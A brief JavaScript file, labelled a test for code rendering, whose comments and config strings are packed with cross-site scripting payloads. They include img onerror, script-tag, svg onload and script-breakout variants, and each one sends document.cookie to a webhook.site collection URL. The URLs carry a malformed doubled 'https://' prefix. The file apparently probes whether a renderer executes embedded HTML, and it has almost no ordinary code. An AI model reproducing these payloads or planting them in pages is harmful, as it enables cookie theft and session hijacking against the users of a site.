// Test file for code rendering
// <img src=x onerror="fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/js-comment?c='+document.cookie)">

/*
<script>fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/js-block-comment?c='+document.cookie)</script>
*/

const config = {
  // <svg onload=fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/js-inline?c='+document.cookie)>
  apiUrl: "https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/beacon/js-string",
  description: "</script><img src=x onerror=fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/js-string-escape?c='+document.cookie)>",
};

function test() {
  return config;
}

module.exports = test;
